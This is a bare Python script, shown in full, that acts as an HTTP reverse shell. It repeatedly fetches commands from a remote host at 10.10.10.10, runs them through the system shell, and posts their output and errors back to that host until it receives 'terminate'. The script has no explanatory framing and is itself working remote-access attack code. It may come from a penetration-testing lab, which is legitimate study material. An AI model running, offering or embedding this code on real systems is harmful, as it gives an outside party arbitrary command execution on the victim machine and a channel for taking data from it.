import requests
import subprocess
import time

HTTPurl = 'http://10.10.10.10'

while True:
    req = requests.get(HTTPurl)
    command = req.text

    if 'terminate' in command:
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url=HTTPurl, data=CMD.stdout.read() )
        post_response = requests.post(url=HTTPurl, data=CMD.stderr.read() )
    time.sleep(3)
